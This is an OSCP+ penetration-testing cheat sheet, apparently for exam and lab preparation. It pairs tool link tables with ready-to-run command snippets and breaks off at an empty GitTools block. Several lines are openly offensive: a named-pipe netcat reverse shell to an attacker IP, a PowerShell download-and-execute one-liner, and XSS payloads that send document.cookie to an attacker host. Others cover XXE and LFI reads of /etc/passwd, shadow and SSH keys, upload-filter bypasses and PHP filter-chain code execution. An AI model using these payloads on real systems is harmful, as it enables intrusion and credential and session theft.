# OSCP+ Cheat Sheet

> **Exam Restrictions**: Automatic exploitation tools like `sqlmap` auto-exploitation are prohibited. Always verify current guidelines before the exam.
> - [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
> - [Proctored Exams](https://help.offsec.com/hc/en-us/sections/360008126631-Proctored-Exams)
>
> **OSCP / HTB Notes**:
> - Keep evidence and commands clearly documented; avoid automation where exam policy forbids it.
> - Verify manual exploitability and service versions before reporting.
> - When pivoting, confirm internal DNS/service reachability and note all network paths.
> - Capture every access method, note credential sources, and preserve payload context for reporting.

---

## Table of Contents

- [Tool Reference](#tool-reference)
  - [File Transfer Tools](#file-transfer)
- [Commands](#commands)
  - [Basics](#basics)
    - [File Transfer](#file-transfer-1)
  - [Information Gathering](#information-gathering)
    - [Common Ports & Protocols](#common-ports--protocols)
  - [Web Application Analysis](#web-application-analysis)
  - [Database Analysis](#database-analysis)
  - [Password Attacks](#password-attacks)
  - [Exploitation Tools](#exploitation-tools)
  - [Post Exploitation](#post-exploitation)
  - [Port Forwarding & Tunneling](#port-forwarding--tunneling)
  - [Virtualization & Hypervisor Attacks](#virtualization--hypervisor-attacks)
  - [Social Engineering Tools](#social-engineering-tools)
- [CVEs & LPE Techniques](#cves--lpe-techniques)
- [Payloads & Reverse Shells](#payloads--reverse-shells)
- [Wordlists](#wordlists)
- [Reporting](#reporting)

---

## Tool Reference

### Basics & Pivoting

| Name | URL |
| --- | --- |
| Chisel | https://github.com/jpillora/chisel |
| CyberChef | https://gchq.github.io/CyberChef |
| FreeRDP / xfreerdp | https://github.com/FreeRDP/FreeRDP |
| Kerberos / MIT Kerberos | https://web.mit.edu/kerberos/ |
| libfaketime | https://github.com/wolfcw/libfaketime |
| Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
| Netsh PortProxy | https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy |
| NTP / ntpdate | https://www.ntp.org/ |
| OpenSSH | https://www.openssh.com/ |
| pip / pipx | https://pipx.pypa.io/ |
| Plink / PuTTY | https://www.chiark.greenend.org.uk/~sgtatham/putty/ |
| Proxychains-ng | https://github.com/rofl0r/proxychains-ng |
| Samba / smbclient / rpcclient / nmblookup | https://www.samba.org/ |
| Socat | http://www.dest-unreach.org/socat/ |
| sshuttle | https://github.com/sshuttle/sshuttle |
| tmux | https://github.com/tmux/tmux |

### File Transfer

| Name | URL |
| --- | --- |
| Certutil | https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil |
| curl | https://curl.se/ |
| FTP | https://www.gnu.org/software/inetutils/ |
| Impacket SMB Server | https://github.com/fortra/impacket |
| Info-ZIP / zip / unzip | https://infozip.sourceforge.net/ |
| Netcat / Ncat | https://nmap.org/ncat/ |
| PHP Built-in Web Server | https://www.php.net/manual/en/features.commandline.webserver.php |
| PowerShell Invoke-WebRequest | https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest |
| Python http.server | https://docs.python.org/3/library/http.server.html |
| Wget | https://www.gnu.org/software/wget/ |

### Information Gathering

| Name | URL |
| --- | --- |
| BIND / dig / nslookup | https://www.isc.org/bind/ |
| enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
| ldapsearch / OpenLDAP | https://www.openldap.org/ |
| memcached | https://memcached.org/ |
| NBTscan | https://github.com/resurrecting-open-source-projects/nbtscan |
| Net-SNMP / snmpwalk | https://www.net-snmp.org/ |
| Nmap | https://github.com/nmap/nmap |
| nikto | https://github.com/sullo/nikto |
| smbmap | https://github.com/ShawnDEvans/smbmap |
| Sparta | https://github.com/SECFORCE/sparta |

### Web Application Analysis

| Name | URL |
| --- | --- |
| Burp Suite | https://portswigger.net/burp |
| ffuf | https://github.com/ffuf/ffuf |
| feroxbuster | https://github.com/epi052/feroxbuster |
| GitTools | https://github.com/internetwache/GitTools |
| Gobuster | https://github.com/OJ/gobuster |
| fpmvuln | https://github.com/hannob/fpmvuln |
| JSON Web Tokens | https://jwt.io |
| JWT_Tool | https://github.com/ticarpi/jwt_tool |
| Leaky Paths | https://github.com/ayoubfathi/leaky-paths |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator |
| PHPGGC | https://github.com/ambionics/phpggc |
| Spose | https://github.com/aancw/spose |
| Wfuzz | https://github.com/xmendez/wfuzz |
| WhatWeb | https://github.com/urbanadventurer/WhatWeb |
| WPScan | https://github.com/wpscanteam/wpscan |

### Database Assessment

| Name | URL |
| --- | --- |
| Impacket mssqlclient | https://github.com/fortra/impacket |
| MongoDB Shell | https://www.mongodb.com/docs/mongodb-shell/ |
| MySQL Client | https://dev.mysql.com/doc/refman/en/mysql.html |
| PostgreSQL psql | https://www.postgresql.org/docs/current/app-psql.html |
| Redis CLI | https://redis.io/docs/latest/develop/tools/cli/ |
| RedisModules-ExecuteCommand | https://github.com/n0b0dyCN/RedisModules-ExecuteCommand |
| Redis RCE | https://github.com/Ridter/redis-rce |
| Redis Rogue Server | https://github.com/n0b0dyCN/redis-rogue-server |
| SQLite CLI | https://www.sqlite.org/cli.html |
| sqlcmd | https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility |
| SQL Injection Cheatsheet | https://tib3rius.com/sqli.html |

### Password Attacks

| Name | URL |
| --- | --- |
| CeWL | https://github.com/digininja/CeWL |
| crunch | https://sourceforge.net/projects/crunch-wordlist/ |
| CUPP | https://github.com/Mebus/cupp |
| Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| DonPAPI | https://github.com/login-securite/DonPAPI |
| fcrackzip | https://www.kali.org/tools/fcrackzip/ |
| Firefox Decrypt | https://github.com/unode/firefox_decrypt |
| GPP Decrypt | https://github.com/t0thkr1s/gpp-decrypt |
| hashcat | https://hashcat.net/hashcat |
| Hydra | https://github.com/vanhauser-thc/thc-hydra |
| John | https://github.com/openwall/john |
| keepass-dump-masterkey | https://github.com/CMEPW/keepass-dump-masterkey |
| KeePwn | https://github.com/Orange-Cyberdefense/KeePwn |
| Kerbrute | https://github.com/ropnop/kerbrute |
| LaZagne | https://github.com/AlessandroZ/LaZagne |
| mimikatz | https://github.com/gentilkiwi/mimikatz |
| NetExec | https://github.com/Pennyw0rth/NetExec |
| ntlm.pw | https://ntlm.pw |
| OpenSSL | https://www.openssl.org/ |
| pypykatz | https://github.com/skelsec/pypykatz |
| Username Anarchy | https://github.com/urbanadventurer/username-anarchy |

### Exploitation & Post Exploitation

| Name | URL |
| --- | --- |
| Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
| Metasploit | https://github.com/rapid7/metasploit-framework |
| Mono / monodis | https://www.mono-project.com/docs/tools+libraries/tools/monodis/ |
| dnSpyEx | https://github.com/dnSpyEx/dnSpy |
| ILSpy / ilspycmd | https://github.com/icsharpcode/ILSpy |
| JetBrains dotPeek | https://www.jetbrains.com/decompiler/ |
| ADCSKiller | https://github.com/grimlockx/ADCSKiller |
| ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
| ADMiner | https://github.com/Mazars-Tech/AD_Miner |
| adPEAS | https://github.com/ajm4n/adPEAS |
| BloodHound | https://github.com/BloodHoundAD/BloodHound |
| BloodHound Python | https://github.com/dirkjanm/BloodHound.py |
| bloodyAD | https://github.com/CravateRouge/bloodyAD |
| Certify | https://github.com/GhostPack/Certify |
| Certipy / certipy-ad | https://github.com/ly4k/Certipy |
| Copy-FileSeBackupPrivilege | https://github.com/giuliano108/SeBackupPrivilege |
| GTFOBins | https://gtfobins.github.io |
| GodPotato | https://github.com/BeichenDream/GodPotato |
| Impacket | https://github.com/fortra/impacket |
| JAWS | https://github.com/411Hall/JAWS |
| JuicyPotatoNG | https://github.com/antonioCoco/JuicyPotatoNG |
| krbrelayx / dnstool.py | https://github.com/dirkjanm/krbrelayx |
| LAPSDumper | https://github.com/n00py/LAPSDumper |
| LES | https://github.com/The-Z-Labs/linux-exploit-suggester |
| LinPEAS | https://github.com/carlospolop/linpeas |
| LinEnum | https://github.com/rebootuser/LinEnum |
| logrotten | https://github.com/whotwagner/logrotten |
| lsassy | https://github.com/Hackndo/lsassy |
| nanodump | https://github.com/fortra/nanodump |
| Neo4j | https://neo4j.com/ |
| PassTheCert | https://github.com/AlmondOffSec/PassTheCert |
| PetitPotam | https://github.com/topotam/PetitPotam |
| PKINITtools | https://github.com/dirkjanm/PKINITtools |
| powercat | https://github.com/besimorhino/powercat |
| PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
| PrintSpoofer | https://github.com/itm4n/PrintSpoofer |
| PrivescCheck | https://github.com/itm4n/PrivescCheck |
| pspy | https://github.com/DominicBreuker/pspy |
| pwncat | https://github.com/calebstewart/pwncat |
| RogueWinRM | https://github.com/antonioCoco/RogueWinRM |
| Rubeus | https://github.com/GhostPack/Rubeus |
| RunasCs | https://github.com/antonioCoco/RunasCs |
| Seatbelt | https://github.com/GhostPack/Seatbelt |
| SharpEfsPotato | https://github.com/bugch3ck/SharpEfsPotato |
| SharpHound | https://github.com/BloodHoundAD/SharpHound |
| Sysinternals PsExec | https://learn.microsoft.com/en-us/sysinternals/downloads/psexec |
| WADComs | https://wadcoms.github.io |
| WESNG | https://github.com/bitsadmin/wesng |
| Whisker | https://github.com/eladshamir/Whisker |
| pyWhisker | https://github.com/ShutdownRepo/pywhisker |
| wsuks | https://github.com/NeffIsBack/wsuks |
| ZeroLogon Tester | https://github.com/SecuraBV/CVE-2020-1472 |

### Payloads & Shells

| Name | URL |
| --- | --- |
| ExifTool | https://exiftool.org/ |
| Groovy | https://groovy-lang.org/ |
| MSFVenom | https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html |
| PowerShell | https://github.com/PowerShell/PowerShell |

### Virtualization & Hypervisor

| Name | URL |
| --- | --- |
| QEMU / qemu-nbd | https://www.qemu.org/ |
| VMware ESXi Command-Line Interface | https://developer.broadcom.com/xapis/esxcli-command-reference/latest/ |
| VMware PowerCLI | https://developer.broadcom.com/powercli |

### Social Engineering & WebDAV

| Name | URL |
| --- | --- |
| Swaks | https://github.com/jetmore/swaks |
| WsgiDAV | https://github.com/mar10/wsgidav |

### Windows Built-ins

| Name | URL |
| --- | --- |
| Certreq | https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certreq_1 |
| DiskShadow | https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow |
| PsExec | https://learn.microsoft.com/en-us/sysinternals/downloads/psexec |
| Schtasks | https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks |
| Volume Shadow Copy Service / VShadow | https://learn.microsoft.com/en-us/windows/win32/vss/volume-shadow-copy-service-portal |
| Windows Commands | https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands |
| Windows Management Instrumentation Command-line | https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic |
| Windows Remote Management | https://learn.microsoft.com/en-us/windows/win32/winrm/portal |

### Exploit Databases

| Database | URL |
| --- | --- |
| 0day.today | https://0day.today |
| Exploit Database | https://www.exploit-db.com |
| Packet Storm | https://packetstormsecurity.com |
| Sploitus | https://sploitus.com |

### Reporting Tools

| Name | URL |
| --- | --- |
| OSCP-Note-Vault | https://github.com/0xsyr0/OSCP-Note-Vault |
| SysReptor | https://github.com/Syslifters/sysreptor |
| SysReptor OffSec Reporting | https://github.com/Syslifters/OffSec-Reporting |
| SysReptor Portal | https://oscp.sysreptor.com/oscp/signup/ |

### Social Media Resources

| Name | URL |
| --- | --- |
| HackTricks | https://book.hacktricks.xyz/ |
| IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
| IppSec.rocks | https://ippsec.rocks/?# |
| 0xdf | https://0xdf.gitlab.io/ |
| Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |
| Hacking Articles | https://www.hackingarticles.in/ |

---

## Commands

### Basics

#### curl

```bash
curl -v http://<DOMAIN>                                          # verbose output
curl -X POST http://<DOMAIN>                                     # use POST method
curl -X PUT http://<DOMAIN>                                      # use PUT method
curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd   # handle /../ or /./ in URL
curl --proxy http://127.0.0.1:8080                               # use proxy
curl -F myFile=@<FILE> http://<RHOST>                            # file upload
curl${IFS}<LHOST>/<FILE>                                         # IFS bypass
```

#### File Transfer

##### Certutil (Windows)
```bash
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>      # download file with Windows certutil
```

##### Netcat
```bash
nc -lnvp <LPORT> > <FILE>                                        # Listener
nc -lnvp <LPORT> -e /bin/bash                                   # Listener with shell
nc <RHOST> <RPORT> < <FILE>                                      # Sender
mkfifo /tmp/backpipe;cat /tmp/backpipe|bash -i 2>&1|nc <ATTACKER_IP> 1337 > /tmp/backpipe    # named-pipe reverse shell
```

##### Impacket SMB
```bash
sudo impacket-smbserver <SHARE> ./                               # serve current directory over SMB
sudo impacket-smbserver <SHARE> . -smb2support                   # serve SMB share with SMB2 support
copy * \\<LHOST>\<SHARE>                                         # copy Windows files to attacker SMB share
```

##### PowerShell
```powershell
iwr <LHOST>/<FILE> -o <FILE>                                     # download file with Invoke-WebRequest alias
IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing                  # download and execute remote PowerShell
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>    # download file to Windows temp
```

##### Python/PHP Web Servers
```bash
sudo python3 -m http.server 80                                   # host files over HTTP on port 80
python3 -m http.server 8000                                      # host files over HTTP on port 8000
sudo php -S 127.0.0.1:80                                         # start local PHP development web server
```

##### Archive Packaging
```bash
zip <ARCHIVE>.zip <FILE>                                         # package one file into ZIP archive
zip -r <ARCHIVE>.zip <DIRECTORY>/                                # package directory recursively into ZIP archive
unzip -l <ARCHIVE>.zip                                           # list ZIP archive contents
unzip <ARCHIVE>.zip -d <OUTPUT_DIR>                              # extract ZIP archive to directory
```

#### FTP

```bash
ftp <RHOST>                                                      # connect to FTP service
ftp -A <RHOST>                                                   # connect to FTP anonymously
wget -r ftp://anonymous:anonymous@<RHOST>                        # recursively mirror anonymous FTP
```

#### Kerberos

```bash
sudo apt-get install krb5-kdc                                    # install Kerberos KDC package
```

##### Ticket Handling
```bash
impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'                 # request TGT with password
klist                                                            # list cached Kerberos tickets
kinit <USERNAME>@<REALM>                                         # request Kerberos ticket interactively
export KRB5CCNAME=<FILE>.ccache                                  # point tools at a ccache file
export KRB5CCNAME='realpath <FILE>.ccache'                       # point tools at absolute ccache path
```

##### Config: /etc/krb5.conf
```ini
[libdefaults]
  default_realm = REALM.TLD
  dns_lookup_kdc = true
  dns_lookup_realm = true

  [realms]
    REALM.TLD = {
        kdc = <fqdn>
    }

[domain_realm]
    .<domain.tld> = REALM.TLD
    <domain.tld> = REALM.TLD
```

##### Ticket Conversion

```bash
# kirbi to ccache
base64 -d <USERNAME>.kirbi.b64 > <USERNAME>.kirbi                # decode base64 kirbi ticket
impacket-ticketConverter <USERNAME>.kirbi <USERNAME>.ccache      # convert kirbi to ccache
export KRB5CCNAME=`realpath <USERNAME>.ccache`                   # use converted ccache for Kerberos tools

# ccache to kirbi
impacket-ticketConverter <USERNAME>.ccache <USERNAME>.kirbi      # convert ccache to kirbi
base64 -w0 <USERNAME>.kirbi > <USERNAME>.kirbi.base64             # encode kirbi for transfer
```

#### RDP

```bash
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore     # RDP login with local credentials
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore    # RDP login with domain credentials
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard    # RDP with resizing and clipboard
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard    # RDP pass-the-hash
xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla    # RDP with relaxed TLS/NLA settings
```

#### SMB

```bash
smbclient -L \\<RHOST>\ -N                                      # list SMB shares anonymously
smbclient //<RHOST>/<SHARE>                                      # connect to SMB share
smbclient //<RHOST>/<SHARE> -U guest%                            # connect as guest with blank password
smbclient -m SMB3 -U '<USERNAME>%<PASSWORD>' //<RHOST>/<SHARE>   # connect to SMB share using SMB3
smbclient //<RHOST>/<SHARE> -U <USERNAME>                        # connect and prompt for password
smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>              # access domain SYSVOL share
mount.cifs //<RHOST>/<SHARE> /mnt/remote                         # mount SMB share locally

# Download multiple files
mask""                                                           # match all SMB files
recurse ON                                                       # enable recursive SMB downloads
prompt OFF                                                       # disable per-file download prompts
mget *                                                           # download matching SMB files
```

#### SSH

```bash
ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1     # connect to legacy SSH key exchange
```

#### Upgrading Shells

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'                   # spawn interactive bash PTY
# Then: ctrl+z → stty raw -echo → fg → enter → enter
export XTERM=xterm                                               # set terminal type for upgraded shell

# Alternative
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;    # fully stabilize TTY

# Script method
script -q /dev/null -c bash                                      # spawn shell through script PTY
```

#### Tmux

```bash
ctrl b + w          # show windows
ctrl + "            # split horizontal
ctrl + %            # split vertical
ctrl + ,            # rename window
ctrl b + [          # enter copy mode
ctrl + /            # search in copy mode (vi)
shift + P           # start/stop logging
```

#### Time Sync (Important for Kerberos)

```bash
sudo ntpdate <RHOST>                                             # sync time with target NTP
sudo ntpdate -b -u <RHOST>                                       # force immediate NTP sync
while [ 1 ]; do sudo ntpdate <RHOST>;done    # continuous sync
sudo net time -S <IP>                                            # query SMB time
sudo timedatectl set-ntp false && sudo net time set -S <NTP_IP>  # disable NTP and set time from SMB
```

---

### Information Gathering

#### Nmap

```bash
sudo nmap -A -T4 -sC -sV -p- <RHOST>                             # full TCP scan with scripts and service detection
sudo nmap -sV -sU <RHOST>                                        # UDP scan with service detection
sudo nmap -A -T4 -sC -sV --script vuln <RHOST>                   # run vulnerability NSE scripts
sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>                    # slower full TCP scan for fragile services
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>    # enumerate Kerberos users
```

#### Port Scanning (No Nmap)

```bash
for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt    # quick full TCP scan with netcat
export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open" 2>/dev/null; done    # bash TCP port sweep
```

#### Common Ports & Protocols

| Category                    | Service             | Ports / Protocol                 |
| --------------------------- | ------------------- | -------------------------------- |
| ICMP                        | ICMP                | None (protocol only)             |
| File Transfer               | FTP                 | TCP/20 (data), TCP/21 (control)  |
| File Transfer               | SCP                 | TCP/22                           |
| File Transfer               | TFTP                | UDP/69                           |
| Remote Access               | SSH                 | TCP/22                           |
| Remote Access               | Telnet              | TCP/23                           |
| Remote Access               | RDP                 | TCP/3389                         |
| Remote Access               | VNC                 | TCP/5900                         |
| Email                       | SMTP                | TCP/25                           |
| Email                       | POP3                | TCP/110                          |
| Email                       | IMAP                | TCP/143                          |
| Email                       | IMAPS (Secure IMAP) | TCP/993                          |
| Email                       | POP3S (Secure POP3) | TCP/995                          |
| Web Services                | HTTP                | TCP/80                           |
| Web Services                | HTTPS               | TCP/443                          |
| Web Services                | HTTP-Proxy          | TCP/8080                         |
| Name and Directory Services | DNS                 | UDP/53, TCP/53                   |
| Name and Directory Services | LDAP                | TCP/389                          |
| Name and Directory Services | mDNS                | UDP/5353                         |
| RPC and SMB                 | RPCbind (NFS)       | TCP/111, UDP/111                 |
| RPC and SMB                 | Microsoft RPC       | TCP/135, UDP/135                 |
| RPC and SMB                 | NetBIOS             | TCP/137-139, UDP/137-139         |
| RPC and SMB                 | SMB                 | TCP/445                          |
| Database Services           | MSSQL               | TCP/1433, UDP/1434               |
| Database Services           | Oracle Database     | TCP/1521, TCP/1630               |
| Database Services           | MySQL & MariaDB     | TCP/3306                         |
| Database Services           | Postgres            | TCP/5432                         |
| Database Services           | Informix            | TCP/9088, TCP/9089               |
| Database Services           | SAP                 | TCP/3200, TCP/3300               |
| Database Services           | IBM DB2             | TCP/50000, TCP/50001             |
| VPN                         | PPTP                | TCP/1723                         |
| Monitoring and Management   | Webmin              | TCP/10000                        |
| Monitoring and Management   | SNMP                | UDP/161                          |
| ICS Protocols               | Modbus              | TCP/502, UDP/502                 |
| ICS Protocols               | DNP3                | TCP/20000, UDP/20000             |
| ICS Protocols               | Ethernet/IP         | TCP/44818                        |

#### DNS Enumeration

```bash
# AD Domain Controller SRV Record Lookup
dig @<DNS_SERVER_IP> _ldap._tcp.dc._msdcs.<AD_DOMAIN> SRV +short    # query AD domain controller SRV records
# Example: dig @10.10.11.60 _ldap._tcp.dc._msdcs.frizz.htb SRV +short
# Output: 0 100 389 frizzdc.frizz.htb.  (priority weight port hostname)
```

#### NetBIOS / SMB Enumeration

```bash
nbtscan <RHOST>                                                   # enumerate NetBIOS names
nmblookup -A <RHOST>                                              # query NetBIOS adapter status
enum4linux-ng -A <RHOST>                                          # enumerate SMB/NetBIOS/LDAP info
smbmap -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -H <RHOST>       # enumerate SMB shares and permissions
smbmap -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -H <RHOST> -x 'net group "Domain Admins" /domain'    # execute command over SMB
```

#### SNMP

```bash
snmpwalk -c public -v1 <RHOST>                                   # walk SNMP v1 with public community
snmpwalk -v2c -c public <RHOST> .1                                # walk full SNMP tree with v2c
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25              # enumerate Windows users over SNMP
```

#### memcached

```bash
echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u 127.0.0.1 11211    # request memcached stats manually
sudo nmap <RHOST> -p 11211 -sU -sS --script memcached-info       # enumerate memcached service
```

#### ldapsearch

```bash
ldapsearch -x -h <RHOST> -s base namingcontexts                  # discover LDAP naming contexts
ldapsearch -H ldap://<RHOST> -x -s base -b '' "(objectClass=*)" "*" +    # query LDAP rootDSE attributes
ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local"    # anonymous LDAP domain query
ldapsearch -x -h <RHOST> -D "<USERNAME>" -b "DC=<DOMAIN>,DC=<DOMAIN>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd    # search for LAPS passwords
```

---

### Web Application Analysis

#### Burp Suite

```
Ctrl+r          # send to repeater
Ctrl+i          # send to intruder
Ctrl+Shift+b    # base64 encode
Ctrl+Shift+u    # URL decode

export HTTP_PROXY=http://localhost:8080                           # route HTTP CLI traffic through Burp
export HTTPS_PROXY=https://localhost:8080                         # route HTTPS CLI traffic through Burp
```

#### ffuf

```bash
# Directory scan
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all    # fuzz directories while filtering size
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401    # fuzz directories by status code

# Subdomain/VHost
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://HOST.TLD -H "Host: FUZZ.HOST.TLD" -fs 0 -ac -fc 400,404,500    # fuzz virtual hosts
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185    # fuzz vhosts with color output

# API fuzzing
ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412    # fuzz API endpoints

# LFI
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../index.php?page=FUZZ -fs 15349    # fuzz LFI payloads

# With PHP session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=<COOKIE>" -fw 2644    # fuzz authenticated PHP files

# Recursion
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/FUZZ -recursion    # recursively fuzz directories

# File extensions
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/FUZZ -e .log    # fuzz names with extension
```

#### feroxbuster

```bash
feroxbuster -u http://<RHOST> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -r --filter-status 403    # recursive directory brute force
feroxbuster -u http://<RHOST> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<RHOST>" -t 100    # virtual host brute force
feroxbuster -u https://<RHOST> -k                                # ignore invalid TLS certificates
```

#### Gobuster

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/    # brute force web directories
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php    # brute force PHP files
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200    # brute force common extensions
gobuster dns -d <DOMAIN> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt    # brute force DNS subdomains
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain    # brute force virtual hosts

# Common extensions: txt,bak,php,html,js,asp,aspx
```

#### wfuzz

```bash
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'    # fuzz path segment and hide errors
wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/FUZZ.txt --sc 200 -t 20    # fuzz files and show 200s
wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/    # fuzz virtual hosts
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST --hc 200 -c    # fuzz login email field
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select    # fuzz POST parameter for SQLi
```

#### WPScan

```bash
wpscan --url https://<RHOST> --enumerate u,t,p                  # enumerate WordPress users, themes, plugins
wpscan --url https://<RHOST> --plugins-detection aggressive      # aggressively detect WordPress plugins
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50 # brute force WordPress login
```

#### Local File Inclusion (LFI)

```bash
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd       # test basic LFI path traversal
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd%00    # php < 5.3
```

##### Encoded Traversal Strings
```
../
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
..././
```

##### php://filter Wrapper
```bash
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index    # read PHP source through filter
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd    # read local file through filter
base64 -d <FILE>.php                                             # decode php://filter base64 output
```

##### Key Linux Files
```
/etc/passwd          /etc/shadow          /etc/hosts
/proc/self/environ   /proc/self/net/arp   /proc/cmdline
~/.ssh/id_rsa        ~/.bash_history      ~/.ssh/authorized_keys
/var/log/apache2/access.log              /var/log/auth.log
/etc/ssh/sshd_config                     /etc/crontab
```

##### Key Windows Files
```
C:/Windows/repair/SAM                    C:/Windows/win.ini
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/Panther/Unattend/Unattended.xml
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
```

#### Server-Side Template Injection (SSTI)

```
# Fuzz string
${{<%[%'"}}%\.

# Magic payload
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

#### Cross-Site Scripting (XSS)

```html
<script>alert('XSS');</script>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
<script>new Image().src="http://<ATTACKER_IP>/collect?c="+encodeURIComponent(document.cookie)</script>
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
```

#### XML External Entity (XXE)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
<stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
```

#### PHP Upload Filter Bypasses

```
.phtml .phP .Php .php3 .php4 .php5 .php7 .pht .phar
<FILE>.php%00.jpg    <FILE>.php%0a    <FILE>.php.jpg
```

#### PHP Filter Chain Generator

```bash
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'    # generate PHP filter RCE chain
python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"    # generate command-execution filter chain
```

#### GitTools

```bash
